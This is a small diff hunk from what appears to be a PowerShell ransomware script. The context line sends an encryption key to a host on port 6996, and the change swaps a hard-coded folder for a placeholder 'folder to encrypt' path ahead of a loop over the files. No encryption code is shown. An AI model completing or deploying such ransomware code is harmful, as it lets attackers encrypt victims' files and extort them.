@@ -69,7 +69,7 @@ Send-Key "localhost" 6996 $key
 
 
 
-$files = Get-ChildItem -Path "/home/cyseen/Powershell/Ransomware"
+$files = Get-ChildItem -Path "PATH/TO/FOLDER/TO/ENCRYPT/DATA"
 
 
 foreach ($file in $files)
